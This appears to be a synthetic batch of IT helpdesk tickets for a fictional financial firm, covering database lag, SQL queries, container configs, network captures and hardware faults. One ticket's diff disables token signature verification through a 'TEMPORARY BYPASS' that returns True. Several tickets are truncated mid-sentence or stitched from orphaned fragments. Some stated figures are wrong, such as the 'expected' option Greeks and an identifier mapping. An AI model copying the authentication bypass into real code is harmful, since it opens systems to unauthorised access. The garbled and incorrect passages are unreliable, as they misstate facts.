subject: Database replication lag causing stale portfolio data
description:
Hi Data Platform team,

We've noticed that the portfolio valuations dashboard is showing data that's
approximately 45 minutes stale. The replication from the primary SQL Server
(SQLPROD-NYC-01) to the read replica (SQLREPLICA-NYC-03) appears to be lagging.

Impact: Portfolio managers are making decisions based on outdated valuations.
This affects approximately 30 PMs across Wealth Management and Asset Management.

What we've confirmed so far:
- Primary database is current (checked via direct query at 14:22 ET)
- Read replica is behind by ~2,700 transactions
- The lag started around 13:35 ET today
- No recent schema changes or maintenance windows
- Disk I/O on the replica server looks elevated: avg write latency 48ms vs
  normal 5ms

We need this resolved urgently. The EOD NAV calculation process kicks off at
16:00 ET and reads from the replica. If the lag isn't cleared by then, we'll
have incorrect NAV calculations which will trigger regulatory reporting
discrepancies and we'll need to file correc

subject: FW: Quarterly IT Infrastructure Review — action items and network issue
description:
Hi IT Support,

Forwarding the full infrastructure review notes below — my actual issue is buried
near the bottom. Please scroll down.

====== QUARTERLY IT INFRASTRUCTURE REVIEW — Q1 2026 ======
Date: March 14, 2026 | Attendees: IT Steering Committee
Location: Building 4, Executive Conference Room 4A

AGENDA ITEM 1: Cloud Migration Status
- Azure landing zone provisioning is 94% complete across all three regions.
- Remaining workloads: legacy COBOL settlement engine (target: May 2026),
  on-prem Oracle RAC cluster for derivatives pricing (target: July 2026).
- Cost optimization: reserved instance coverage improved from 61% to 78%.
- Action: Cloud team to finalize RI recommendations for Q2 by March 28.

AGENDA ITEM 2: Endpoint Refresh Program
- 1,200 of 3,400 laptops refreshed to Dell Latitude 5550 with Windows 11 23H2.
- Remaining rollout schedule: NYC Building 1-3 (April), London (May), Singapore (June).
- Dock compatibility issues reported with TB16 docks — WD19S replacement in progress.
- BitLocker recovery key escrow migration to Intune on track for April 1.
- Action: Endpoint team to publish refresh FAQ on the intranet by March 21.

AGENDA ITEM 3: Network Capacity Planning
- Core switch fabric utilization peaked at 72% during February month-end processing.
- Wireless controller firmware upgraded to 8.10.185 across all NYC APs.
- SD-WAN deployment for London and Singapore branch offices approved — RFP in April.
- Action: Network ops to model 100G uplink requirements for 2027 budget.

AGENDA ITEM 4: Security & Compliance Update
- SOC 2 Type II audit fieldwork begins April 7. All evidence must be staged by April 1.
- Phishing simulation click rate dropped from 12% to 8.5% — goal is 5% by year-end.
- Privileged Access Workstation (PAW) rollout to Tier 0 admins complete.
- Action: Security ops to deliver PAW Tier 1 rollout plan by March 28.

AGENDA ITEM 5: Service Desk Metrics
- Mean time to resolve (MTTR): 4.2 hours (target 4.0) — slight regression from Feb.
- First-contact resolution rate: 68% (target 70%).
- Top ticket categories: Password resets (24%), VPN issues (18%), Outlook (14%).
- Action: Evaluate chatbot deflection for password reset tickets.

AGENDA ITEM 6: Disaster Recovery Testing
- Full DR failover test for Azure-hosted trading platform scheduled for April 19-20.
- RPO target: 15 minutes. RTO target: 2 hours. Last test achieved RPO 12m, RTO 1h 48m.
- Cross-region replication lag for Cosmos DB reduced from 320ms to 95ms.
- Action: DR team to coordinate with Trading and Compliance for the test window.

AGENDA ITEM 7: Data Center Decommissioning
- Secaucus DC lease expires September 2026. 14 remaining racks to be migrated.
- Physical server inventory audit complete — 6 servers unaccounted for, investigating.
- Tape backup archive migration to Azure Blob Archive tier: 340TB of 480TB complete.
- Action: Facilities to confirm decommissioning timeline with vendor by April 4.

--- END OF AGENDA ITEMS ---

** MY ACTUAL ISSUE (sorry for the long email) **

On page 2 of the notes it mentions TB16 dock compatibility issues. I'm one of the
affected users — my Dell Latitude 5550 with the TB16 dock loses USB-C video output
intermittently. Both my external Dell U2722D monitors go black for 5-10 seconds
every 20-30 minutes. I'm on the 8th floor, Building 4. The old WD19S dock I had
before worked perfectly but it was collected during the refresh.

Can I get a replacement WD19S dock or a fix for the TB16 compatibility?

Thanks,
Jonathan Park
Portfolio Management, Building 4, 8th floor, New York

subject: Production report query keeps timing out
description:
Hi team,

My daily P&L reconciliation report has been timing out since Monday morning. The query runs against the production warehouse and normally finishes in about 2 minutes, but now it just hangs until the 30-minute timeout kills it. Here is the query I'm running:

SELECT
    t.trade_id,
    t.trade_date,
    t.settlement_date,
    t.counterparty_id,
    cp.counterparty_name,
    cp.lei_code,
    t.instrument_type,
    t.isin,
    sec.security_description,
    sec.currency_code,
    t.quantity,
    t.price,
    t.notional_amount,
    t.accrued_interest,
    t.net_settlement_amount,
    t.trade_status,
    pos.start_of_day_position,
    pos.end_of_day_position,
    pos.realized_pnl,
    pos.unrealized_pnl,
    pos.total_pnl,
    fx.exchange_rate,
    fx.rate_source,
    CASE
        WHEN t.notional_amount > 10000000 THEN 'LARGE'
        WHEN t.notional_amount > 1000000 THEN 'MEDIUM'
        ELSE 'SMALL'
    END AS trade_size_bucket,
    COALESCE(r.regulatory_flag, 'NONE') AS reg_flag
FROM trades t
INNER JOIN counterparties cp ON t.counterparty_id = cp.counterparty_id
INNER JOIN securities sec ON t.isin = sec.isin
LEFT JOIN positions pos ON t.trade_id = pos.trade_id
    AND pos.position_date = t.trade_date
LEFT JOIN fx_rates fx ON sec.currency_code = fx.currency_code
    AND fx.rate_date = t.trade_date
LEFT JOIN regulatory_flags r ON t.trade_id = r.trade_id
WHERE t.trade_date BETWEEN '2026-03-01' AND '2026-03-17'
    AND t.trade_status IN ('CONFIRMED', 'SETTLED', 'PENDING')
    AND t.book_id IN (
        SELECT book_id FROM book_permissions
        WHERE analyst_id = 'HWONG'
    )
ORDER BY t.trade_date DESC, t.notional_amount DESC;

Nothing changed on my end — same query I run every day. I suspect something happened to the database indexes over the weekend. Can someone from the data platform team investigate?

Thanks,
Henry Wong
Portfolio Analytics, Building 4

subject: Teams integration not syncing with calendar
description:
# Issue Report: Teams Calendar Integration Failure

**Reporter:** Amara Osei
**Department:** Client Relations
**Date:** 2026-03-17

## Problem Description

The Microsoft Teams integration with my Outlook calendar has completely stopped working. When I schedule a meeting in **Outlook**, it *does not* appear in **Teams**, and vice versa. This started after the IT department pushed the latest `Teams Desktop Client v24.7.1` update last Thursday.

## Steps to Reproduce

1. Open **Outlook Desktop** and create a new meeting
2. Add a Teams link by clicking `Add Teams Meeting`
3. Send the invite
4. Open **Microsoft Teams** > Calendar tab
5. Notice the meeting **does not appear**

## What I've Tried

- [x] Signed out and back into Teams
- [x] Cleared the Teams cache (`%appdata%\Microsoft\Teams\Cache`)
- [x] Restarted my laptop
- [ ] Reinstalled Teams (waiting for IT approval)

## Expected Behavior

Meetings created in Outlook should appear in Teams calendar within ~30 seconds, as documented in the [Teams admin guide](https://learn.microsoft.com/en-us/microsoftteams/exchange-teams-interact).

## Impact

I have **5+ client meetings daily** and have already missed joining two calls because they didn't show in Teams. This is affecting client experience.

---

```
Teams Version: 24.7.1.0
Outlook Version: 16.0.17328.20162
OS: Windows 11 Enterprise 23H2
```

Please advise. Thanks!

Every time I restart Outlook, my email signature resets to the old one from 2024 instead of my updated signature. I export the registry key to show you what it looks like:

Kenichi Tanaka
Client Services

subject: API error with nested JSON — can't parse response
description:
Our integration with the compliance reporting API is failing. The API returns an error response, but the error body contains triple-escaped JSON that's nearly impossible to read. Here's the raw response:

{"status":"error","code":500,"message":"Internal processing failure","details":"{\"pipeline\":\"compliance-etl-v2\",\"stage\":\"transform\",\"error\":{\"type\":\"SchemaValidationError\",\"message\":\"Field \\\\\\\"transaction_id\\\\\\\" expected type \\\\\\\"string\\\\\\\" but received \\\\\\\"null\\\\\\\"\",\"context\":{\"record_number\":45892,\"batch_id\":\"BATCH-20260317-0923\",\"source_table\":\"dbo.RawTransactions\",\"target_schema\":\"{\\\\\\\\\\\\\\\\"fields\\\\\\\\\\\\\\\\":[{\\\\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\\\"transaction_id\\\\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\\\"string\\\\\\\\\\\\\\\\\"}]}\"}}}"

The actual issue is that null transaction_id values are getting through from the RawTransactions table in batch BATCH-20260317-0923, which started at 9:23 AM today. This is breaking the compliance ETL pipeline and we can't generate the daily regulatory report.

The pipeline runs on our Azure Data Factory instance (adf-contoso-prod-eastus2). We need this fixed before the 5 PM regulatory filing deadline.

James O'Brien
Regulatory Affairs

Our London office manager forwarded a batch of issues that were collected at this morning's all-hands. I'm dumping them all into one ticket because our portal was down earlier. Please split these out as needed.

The settlement reconciliation app crashes every time I try to export to CSV. Error: 'System.OutOfMemoryException'. It started after the latest update on Friday. Machine: LDN-WS-1147.

=== ISSUE 2 (from Amara Osei, Client Services) ===
WiFi in the London office 3rd floor conference rooms A, B, and C has been extremely slow since they installed the new partitions last week. Video calls keep freezing. We have client meetings there daily.

I need access to the GDPR Data Subject Request portal. I transferred from the Dublin office last month and my access was supposed to follow me but it didn't. My manager is Fiona O'Leary.

Our Bloomberg Terminal (serial: BT-LDN-0093) has been showing 'Connection to B-PIPE lost' intermittently. The data feed drops for 30-60 seconds every hour or so. We're in the middle of model validation and need reliable market data.

The HR shared mailbox (hr-london@contoso.com) is bouncing incoming emails with 'Mailbox full' errors. We've already archived everything older than 6 months but it's still at 49.8 GB of the 50 GB limit.

subject: Bloomberg Terminal license renewal request for the Quantitative Analysis team — license key BBGTERM-QA-2026-0047 is expiring on March 31 and we need it renewed before end of month or we lose access to the B-PIPE data feed which is critical for our model calibration pipeline
description:
Hi IT,

As mentioned in the subject, our Bloomberg Terminal license (key: BBGTERM-QA-2026-0047) is set to expire on March 31, 2026. This license covers 3 terminals used by our quant team for real-time market data via the B-PIPE feed.

We already have budget approval from our department head (Maria Santos). The renewal PO was submitted through Ariba last week (PO-2026-11847).

Can you coordinate with Bloomberg to ensure the license is renewed before the expiry date? If we lose access even for a day it will disrupt our risk model validation cycle.

Thanks,
Andrew Kim
Quantitative Analysis

subject: RE: RE: RE: Multiple items — printer, badge, parking, and laptop dock issue
description:
Hi IT team,

I wanted to follow up on a few things.

First, regarding the printer on Floor 7 — it seems to be working now after someone replaced the toner. Thanks for that. I noticed it was jamming a bit yesterday but today it printed my 50-page report with no issues.

Second, my badge stopped working at the south entrance on Monday but I used the north entrance and it was fine. I think it might be the reader on the south door rather than my badge. I asked security and they said they'd look into it. Let me know if you need me to file a separate ticket for that.

Third, the parking garage barrier was stuck on Tuesday morning. I had to wait about 15 minutes for someone to manually raise it. By the time I got back in the evening it was working fine. I mention this just in case it's related to the building systems.

Also, I saw that the kitchen coffee machine on Floor 5 is showing an error message. Not sure if that falls under IT but figured I'd mention it. The error code was E-42 or something like that.

Oh and one more thing — I moved offices last week from Building 2 to Building 4 and the wireless coverage here is much worse. I keep getting dropped from Teams calls. But that's a separate issue I think.

Anyway, the reason I'm actually writing is about my laptop docking station. Since I moved to the new office in Building 4, Floor 3, my Lenovo ThinkPad X1 Carbon won't detect the external monitors when I plug it into the USB-C dock. The dock powers the laptop and the keyboard and mouse work, but neither of the two Dell U2722D monitors gets a signal. I've tried different USB-C cables and both Thunderbolt ports on the laptop. My colleague's laptop works fine with the same dock and monitors, so it seems to be something specific to my machine. This is really impacting my productivity because I'm working on a dual-monitor workflow for the Q2 risk models.

Thanks,
Aisha

---
Aisha Okonkwo | Senior Risk Analyst
Risk Management | Building 4, Floor 3
Contoso Financial Services

subject: Error report from compliance scanner — see attached PDF
description:
Hi IT,

The compliance scanner flagged some issues on our trading floor servers. I tried to attach the PDF but our email system embedded it inline. Here's the full report:

data:application/pdf;base64,

The key finding is that three servers on the trading floor (TRDSVR-01, TRDSVR-02, TRDSVR-04) have outdated TLS certificates that expire this Friday. If they're not renewed before market open Monday, the trading platform connections to the clearing house will fail. TRDSVR-03 was renewed last month so it's fine.

Can someone prioritize getting those certs renewed? The clearing house requires TLS 1.3 with certs from our approved CA.

Thanks,
Nikhil

subject: [Translated from Japanese] Problem with network connection in the London office
description:
[This message was automatically translated from Japanese]
[Translation confidence: Medium]

Dear IT Help Table,

I am writing to you about the internet connection problem that is occurring in the London office Building 5, Floor 2. The network is doing 'going on and off' behavior since the morning of today.

When I make the ping to the server of gateway (192.168.5.1), the packet loss is showing 30-40% of the ratio. The speed test is revealing 2 Mbps of the download which is very far from the normal 500 Mbps that we are usually receiving.

The problem is affecting approximately 15 persons of the Fixed Income team who are sitting in the same area. The wireless access point that we are connecting to has the name 'LON-B5-F2-AP04'. The other access points in the near vicinity seem to be functioning with normality.

We attempted the restart of our laptop computers and the clearing of the DNS cache but the problem is persisting. The Bloomberg terminals that are connected by the ethernet cable are not having this problem.

Please investigate this matter with urgency as the Fixed Income team cannot execute the trades with reliability in the current condition.

With respectful regards,
Takeshi Yamamoto
Fixed Income Division, London Office

subject: Database query performance degradation
description:
Hi DBA team,

Our production SQL Server instance (SQLPROD-03) is experiencing severe performance degradation since this morning.

Key symptoms:
• Average query response time increased from 50ms to 3,200ms
• CPU utilization at 94% (normally 35%)
• TempDB is growing rapidly — currently at 180GB (normally 20GB)
• Multiple blocking chains in sys.dm_exec_requests

I suspect the new ETL job that was deployed last night (job: DailyRiskCalc_v2) is causing excessive TempDB spills. The previous version was fine.

Server details:
• SQL Server 2022 (16.0.4145.4)
• 256GB RAM, 64 cores
• SAN storage: Pure FlashArray

Regards,
Hannah Park
Data Engineering

subject: Container deployment failing in staging
description:
Hi team,

Our staging deployment pipeline is failing. The risk-engine container keeps crash-looping. Here's the docker-compose.yml we're using:

```yaml
version: '3.8'
services:
  risk-engine:
    image: contoso.azurecr.io/risk-engine:2.4.1
    deploy:
      replicas: 3
      resources:
        limits:
          cpus: '4'
          memory: 8G
        reservations:
          cpus: '2'
          memory: 4G
    environment:
      - REDIS_HOST=redis-cluster.staging.svc
      - REDIS_PORT=6379
      - DB_HOST=sqlserver-staging.contoso.internal
      - DB_PORT=1433
      - DB_NAME=RiskCalcStaging
      - LOG_LEVEL=DEBUG
      - MARKET_DATA_ENDPOINT=http://market-data:8080/api/v2
    ports:
      - '8443:8443'
    depends_on:
      - redis-cluster
      - market-data
    healthcheck:
      test: ['CMD', 'curl', '-f', 'http://localhost:8443/health']
      interval: 30s
      timeout: 10s
      retries: 3
  redis-cluster:
    image: redis:7-alpine
    ports:
      - '6379:6379'
  market-data:
    image: contoso.azurecr.io/market-data-mock:1.0.0
    ports:
      - '8080:8080'
```

The container logs show:
```
risk-engine_1  | 2026-03-17 08:15:03 ERROR Failed to connect to sqlserver-staging.contoso.internal:1433 — Connection refused
risk-engine_1  | 2026-03-17 08:15:03 ERROR Database initialization failed after 5 retries
risk-engine_1  | 2026-03-17 08:15:03 FATAL Shutting down due to unrecoverable error
```

It looks like the SQL Server staging instance is unreachable from the container. The database was migrated to a new server last week — maybe the hostname changed?

subject: Code review system broken after merge
description:
The PR review system stopped working after my merge. Here's the diff that broke it:

```diff
diff --git a/src/auth/middleware.py b/src/auth/middleware.py
index 7a8b9c0..1d2e3f4 100644
--- a/src/auth/middleware.py
+++ b/src/auth/middleware.py
@@ -42,7 +42,7 @@ class AuthMiddleware:
     def validate_token(self, token: str) -> bool:
-        if not token or len(token) < 10:
+        if not token:
             return False
-        return self._verify_signature(token)
+        # TODO: re-enable signature verification after cert rotation
+        return True  # TEMPORARY BYPASS
 
     def _verify_signature(self, token: str) -> bool:
         try:
@@ -67,3 +68,8 @@ class AuthMiddleware:
             logger.error(f'Token verification failed: {e}')
             return False
+
+    def _skip_auth_for_testing(self):
+        # Added for load testing - remove before production
+        self._auth_enabled = False
+        logger.warning('Authentication disabled for testing')
```

After this merge, the Azure DevOps pipeline that runs PR checks started returning 500 errors on the webhook endpoint. The pipeline was working fine before the merge. I don't think my code changes caused the pipeline failure — it's more likely something with the DevOps agent or the webhook configuration.

Can someone check the pipeline agent pool and the webhook endpoint?

subject: Report aggregation returning wrong totals
description:
Hi Data Platform team,

The quarterly revenue report is showing incorrect aggregation totals. Here is the query I am running:

WITH regional_sales AS (
    SELECT r.region_name, SUM(s.amount) AS total_sales
    FROM sales s
    JOIN regions r ON s.region_id = r.id
    WHERE s.sale_date BETWEEN '2026-01-01' AND '2026-03-31'
    GROUP BY r.region_name
),
top_regions AS (
    SELECT region_name, total_sales
    FROM regional_sales
    WHERE total_sales > (
        SELECT SUM(total_sales) / 10 FROM regional_sales
    )
)
SELECT o.order_id, o.amount, t.region_name, t.total_sales
FROM orders o
JOIN top_regions t ON o.region_name = t.region_name
ORDER BY t.total_sales DESC;

The total_sales column does not match what Finance is reporting. I think the JOIN between orders and top_regions is creating duplicates but I am not sure. Can someone take a look?

Thanks,
Raj Patel
Data Engineering

subject: Meeting room double-bookings — dates are all wrong
description:
Hi IT,

We keep getting meeting room conflicts. The booking system shows different dates depending on where you look:

- Outlook says the meeting is on 03/04/2026 (is that March 4 or April 3?)
- The room display panel shows 04-Mar-26
- The booking API returns 2026-03-04T14:00:00Z
- The export CSV has 1709560800 (epoch seconds)
- The audit log shows 04/03/2026 10:00 AM EST

I booked Conference Room B on what I thought was March 4th at 2 PM ET, but someone else booked the same room for April 3rd and the system did not flag a conflict. Or maybe we both booked March 4th and the system just allowed a double-booking?

This has happened at least three times this month with different rooms. The London office says they see dates in DD/MM/YYYY but we see MM/DD/YYYY in New York.

Thanks,
Preeti Sharma
Operations

subject: Bloomberg data feed mapping error — CUSIP/ISIN mismatch
description:
Hi Enterprise Apps,

We are seeing incorrect data in the Bloomberg terminal for several securities. The mapping between identifiers is wrong:

- AAPL US Equity (BBG ticker) maps to CUSIP 037833100 which is correct
- But MSFT US Equity maps to CUSIP 594918104 which is actually the CUSIP for META
- ISIN US5949181045 should be MSFT but resolves to META in our system
- SEDOL 2588173 (MSFT on LSE) maps correctly in London but not NY
- BBG FIGI BBG000BPH459 shows MSFT but pulls META pricing

This started after the overnight data feed refresh at 02:15 UTC. The raw feed file looks correct but something in our mapping layer is swapping MSFT and META identifiers.

This is impacting P&L calculations for the equities desk.

Thanks,
Victor Nwosu
Quantitative Analysis

subject: High DNS query latency — tcpdump output included
description:
Hi Network Ops,

DNS resolution is extremely slow from the trading floor (Building A, Floor 3). I ran tcpdump and here is what I captured:

14:23:01.234567 IP 10.50.3.101.52341 > 10.1.1.53.53: 12345+ A? api.contoso.com. (33)
14:23:04.567890 IP 10.1.1.53.53 > 10.50.3.101.52341: 12345 1/0/0 A 10.100.5.20 (49)
14:23:04.568123 IP 10.50.3.101.52342 > 10.1.1.53.53: 12346+ AAAA? api.contoso.com. (33)
14:23:07.891234 IP 10.1.1.53.53 > 10.50.3.101.52342: 12346 0/1/0 (98)
14:23:07.891567 IP 10.50.3.101.52343 > 10.1.1.53.53: 12347+ A? market-data.contoso.com. (40)
14:23:11.123456 IP 10.1.1.53.53 > 10.50.3.101.52343: 12347 1/0/0 A 10.100.5.30 (56)

Each DNS query takes over 3 seconds to resolve. The DNS server is 10.1.1.53. This is causing timeouts in our trading applications. Normal resolution time should be under 10ms.

Thanks,
Chen Wei
Institutional Trading

subject: Containerized reconciliation app won't start after infra migration
description:
Hi team,

Since the infrastructure team migrated us to the new Docker hosts last week, our Trade Reconciliation app won't start. I've attached all three of our docker-compose files below. Can someone tell me what's wrong?

=== docker-compose.yml (base) ===
version: '3.8'
services:
  recon-api:
    image: contosoacr.azurecr.io/trade-recon-api:4.1.0
    ports:
      - '8080:8080'
    environment:
      - ASPNETCORE_ENVIRONMENT=Production
      - ConnectionStrings__ReconDB=Server=sqlprod-03.contoso.local;Database=TradeRecon;Trusted_Connection=true
      - Redis__Endpoint=redis-cluster.contoso.local:6379
      - Kafka__BootstrapServers=kafka-01.contoso.local:9092,kafka-02.contoso.local:9092
    depends_on:
      - recon-worker
      - redis
    networks:
      - recon-net
    deploy:
      resources:
        limits:
          memory: 2G
          cpus: '1.0'
    healthcheck:
      test: ['CMD', 'curl', '-f', 'http://localhost:8080/health']
      interval: 30s
      timeout: 10s
      retries: 3

  recon-worker:
    image: contosoacr.azurecr.io/trade-recon-worker:4.1.0
    environment:
      - WORKER_CONCURRENCY=8
      - ConnectionStrings__ReconDB=Server=sqlprod-03.contoso.local;Database=TradeRecon;Trusted_Connection=true
      - Kafka__BootstrapServers=kafka-01.contoso.local:9092,kafka-02.contoso.local:9092
      - Kafka__ConsumerGroup=recon-worker-prod
    networks:
      - recon-net
    deploy:
      replicas: 3
      resources:
        limits:
          memory: 4G
          cpus: '2.0'

  redis:
    image: redis:7.2-alpine
    ports:
      - '6379:6379'
    volumes:
      - redis-data:/data
    networks:
      - recon-net

volumes:
  redis-data:

networks:
  recon-net:
    driver: bridge

=== docker-compose.override.yml ===
version: '3.8'
services:
  recon-api:
    ports:
      - '8443:8443'
    environment:
      - ASPNETCORE_URLS=https://+:8443;http://+:8080
      - ASPNETCORE_Kestrel__Certificates__Default__Path=/certs/contoso-recon.pfx
      - ASPNETCORE_Kestrel__Certificates__Default__Password=${CERT_PASSWORD}
    volumes:
      - /etc/contoso/certs:/certs:ro

=== docker-compose.monitoring.yml ===
version: '3.8'
services:
  prometheus:
    image: prom/prometheus:v2.51.0
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
    ports:
      - '9090:9090'
    networks:
      - recon-net

The error when I run docker compose up is:
Error response from daemon: pull access denied for contosoacr.azurecr.io/trade-recon-api, repository does not exist or may require 'docker login'

The images definitely exist in our ACR — I can see them in the Azure portal. I think the new Docker hosts aren't authenticated to our container registry.

This is blocking the entire Trade Ops team from running end-of-day reconciliation.

Kevin Nguyen
Trade Operations Technology
Ext 3-2198

subject: Data export from ContosoReporter tool showing formulas instead of values
description:
Hi,

Something is very wrong with the ContosoReporter data export. When I export the daily P&L summary to Excel and then paste it into our risk system upload template, all the formulas are showing instead of values. Here's what the clipboard paste looks like:

Desk	Gross P&L	Net P&L	VaR Utilization	Trade Count	Notional ($M)
Equity Trading	=SUM(B14:B87)	=B2-VLOOKUP(A2,Costs!A:C,3,FALSE)	=IF(D2>0.85,"BREACH",IF(D2>0.7,"WARNING","OK"))	=COUNTA(Trades!A:A)-1	=SUMPRODUCT(Trades!F2:F500,Trades!G2:G500)/1000000
Fixed Income	=SUM(B88:B134)	=B3-VLOOKUP(A3,Costs!A:C,3,FALSE)	#REF!	=COUNTIFS(Trades!B:B,"FI",Trades!H:H,">0")	=SUMPRODUCT((Trades!B2:B500="FI")*Trades!F2:F500*Trades!G2:G500)/1000000
FX & Rates	#N/A	=B4-VLOOKUP(A4,Costs!A:C,3,FALSE)	=C15/VLOOKUP(A4,Limits!A:B,2,FALSE)	=COUNTIFS(Trades!B:B,"FX*")	#VALUE!
Credit	=SUM(B200:B267)	=B5-VLOOKUP(A5,Costs!A:C,3,FALSE)	=C16/VLOOKUP(A5,Limits!A:B,2,FALSE)	=COUNTIFS(Trades!B:B,"CRD")	=SUMPRODUCT((Trades!B2:B500="CRD")*Trades!F2:F500*Trades!G2:G500)/1000000
Commodities	=SUM(B268:B301)	#REF!	=C17/VLOOKUP(A6,Limits!A:B,2,FALSE)	=COUNTIFS(Trades!B:B,"CMDTY")	#N/A
TOTAL	=SUM(B2:B6)	=SUM(C2:C6)	=MAX(D2:D6)	=SUM(E2:E6)	=SUM(F2:F6)

There are also these errors scattered throughout:
#REF! — appears in Fixed Income VaR Utilization and Commodities Net P&L
#N/A — appears in FX & Rates Gross P&L and Commodities Notional
#VALUE! — appears in FX & Rates Notional

The previous version of ContosoReporter (v2.8) exported actual calculated values. Since the upgrade to v3.0 last week, it's exporting the raw formulas. The risk system upload rejects the file because it expects numeric values, not formula strings.

I need this fixed before 6 PM ET — that's when the daily risk report is due to the Chief Risk Officer. I've been manually calculating these values for the past 3 days and it takes over 2 hours each time.

Tanya Birch
Risk Reporting Analyst
Enterprise Risk Management
Floor 9, NYC Office

subject: Trade settlement workflow stuck — see diagram of expected flow
description:
Hello IT Support,

Our trade settlement workflow engine (ContosoSettleFlow v4.2) has been stuck in the 'Pending Confirmation' state for all USD/EUR FX spot trades since last night. Normally, these settle within T+2, but nothing has moved since 11 PM yesterday.

I drew the expected flow so you can see where it's breaking:

```mermaid
graph TD
    A[Trade Executed] --> B{Validation OK?}
    B -->|Yes| C[Send to Matching Engine]
    B -->|No| D[Return to Trader]
    C --> E{Match Found?}
    E -->|Yes| F[Generate Confirmation]
    E -->|No| G[Queue for Manual Match]
    F --> H[Counterparty Ack]
    H --> I{Ack Received?}
    I -->|Yes| J[Schedule Settlement]
    I -->|No, timeout 4hr| K[Escalate to Ops]
    J --> L[Settlement Complete]
    K --> M[Manual Resolution]
```

The process appears to be stuck between step F (Generate Confirmation) and step H (Counterparty Ack). The confirmations ARE being generated — I can see them in the Confirmations table — but the SWIFT gateway does not appear to be transmitting them to the counterparties.

Here is the sequence as I understand it:

```plantuml
@startuml
participant SettleFlow
participant ConfirmationSvc
participant SWIFTGateway
participant Counterparty

SettleFlow -> ConfirmationSvc: generateConfirm(tradeId)
ConfirmationSvc --> SettleFlow: confirmId=CFM-20240315-001
SettleFlow -> SWIFTGateway: send(confirmId)  <-- THIS TIMES OUT
SWIFTGateway --> SettleFlow: timeout after 120s
SettleFlow -> SettleFlow: retry (max 3)
SWIFTGateway --> SettleFlow: timeout after 120s
SettleFlow -> SettleFlow: mark as PENDING_CONFIRMATION
@enduml
```

There are currently 142 trades stuck in this state. The operations team is manually calling counterparties to confirm, but this is not sustainable. Can someone look at the SWIFT gateway connectivity?

Priya Venkatesh
Settlement Operations Analyst
Post-Trade Services
Desk: 3-East, Row C

subject: ContosoCalc option pricing module returns wrong Greeks — formula ref
description:
Hi Support,

The ContosoCalc pricing library (v8.3.1) is returning incorrect Delta and Gamma values for European-style equity options. I've been comparing the output against our validated reference spreadsheet and the values diverge significantly for deep in-the-money options.

For reference, the correct Black-Scholes formulas that ContosoCalc should be implementing are:

The option price:
$$C = S_0 N(d_1) - K e^{-rT} N(d_2)$$

Where:
$$d_1 = \frac{\ln(S_0/K) + (r + \sigma^2/2)T}{\sigma\sqrt{T}}$$
$$d_2 = d_1 - \sigma\sqrt{T}$$

Delta should be:
$$\Delta = \frac{\partial C}{\partial S} = N(d_1)$$

And Gamma:
$$\Gamma = \frac{\partial^2 C}{\partial S^2} = \frac{N'(d_1)}{S_0 \sigma \sqrt{T}}$$

Where $N'(x) = \frac{1}{\sqrt{2\pi}} e^{-x^2/2}$ is the standard normal PDF.

The specific test case where I see the error:
- Spot price $S_0 = 150$, Strike $K = 100$, Risk-free rate $r = 0.05$
- Volatility $\sigma = 0.20$, Time to expiry $T = 0.5$ years
- Expected Delta: 0.9782, ContosoCalc returns: 0.8431
- Expected Gamma: 0.0045, ContosoCalc returns: 0.0312

The error seems to be in the $d_1$ calculation — I suspect the library is using $\sigma$ instead of $\sigma^2/2$ in the drift term, which would be a classic implementation bug:
$$d_1^{\text{buggy}} = \frac{\ln(S_0/K) + (r + \sigma)T}{\sigma\sqrt{T}} \neq d_1^{\text{correct}}$$

This was introduced in v8.3.1 — version 8.3.0 was correct. Can the quantitative development team investigate?

Natalie Zhao
Quantitative Analyst
Derivatives Pricing
Floor 12, Quant Lab

subject: Azure deployment failed for ContosoPayments staging — ARM template attached
Build pipeline broken — config file has merge issues after branch merge
description:
Hi team,

Our CI/CD build pipeline (Azure DevOps, contoso-tradeledger repo) has been failing since this morning. I merged the feature/settlement-batch branch into main at 7:40 AM and the build broke immediately. The error says 'Invalid YAML' in the pipeline config.

I looked at the config file and found the problem — there are merge conflicts that didn't get resolved. Here's what the file looks like right now:

# contoso-tradeledger pipeline config
service:
  name: trade-ledger-service
  version: 4.12.0

database:
<<<<<<< HEAD
  host: sql-tradeledger-prod.database.windows.net
  port: 1433
  name: TradeLedgerDB
  pool_size: 25
  timeout: 30
=======
  host: sql-tradeledger-prod-v2.database.windows.net
  port: 1433
  name: TradeLedgerDB_v2
  pool_size: 50
  timeout: 60
  retry_count: 3
  retry_delay: 5
>>>>>>> feature/settlement-batch

batch_processing:
<<<<<<< HEAD
  enabled: false
  batch_size: 100
=======
  enabled: true
  batch_size: 500
  parallel_workers: 4
  checkpoint_interval: 60
>>>>>>> feature/settlement-batch

logging:
  level: INFO
  output: /var/log/tradeledger/app.log

I'm not sure which version of the database config is correct — the old one pointing to sql-tradeledger-prod or the new one pointing to sql-tradeledger-prod-v2. The feature branch was supposed to migrate us to the new database with larger pool sizes for batch settlement.

The build has been red for 3 hours now and the team can't merge any other PRs. Can someone help us resolve this properly?

Tomás Rivera
Software Developer
Trade Ledger Engineering
Austin Office, Bldg 2

Subject: Teams audio issue

Hi team,

My Teams audio has been cutting out during calls for the last two days. The other participants can hear me for about 30 seconds, then my audio drops and they hear nothing until I toggle my mic off and on. Video continues to work fine. Thanks,
Diana Morales
Wealth Management

subject: Intermittent network drops on Floor 7 — topology diagram attached inline
description:
Hi Network Ops,

We are experiencing intermittent connectivity drops on Floor 7, Building 2 in the New York office. About 15 users are affected. I drew a diagram of our floor layout showing the affected areas:

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600">
  <rect x="0" y="0" width="800" height="600" fill="#f5f5f5" stroke="#333" stroke-width="2"/>

  <rect x="50" y="50" width="200" height="150" fill="#e8f5e9" stroke="#4caf50" stroke-width="1"/>
  <text x="150" y="80" text-anchor="middle" font-size="12">Trading Desk A (OK)</text>

  <text x="400" y="80" text-anchor="middle" font-size="12" fill="#f44336">Trading Desk B (AFFECTED)</text>
  <rect x="550" y="50" width="200" height="150" fill="#ffebee" stroke="#f44336" stroke-width="2"/>
  <text x="650" y="80" text-anchor="middle" font-size="12" fill="#f44336">Risk Team Area (AFFECTED)</text>
  <rect x="50" y="250" width="200" height="150" fill="#e8f5e9" stroke="#4caf50" stroke-width="1"/>
  <text x="150" y="280" text-anchor="middle" font-size="12">Conference Rooms (OK)</text>
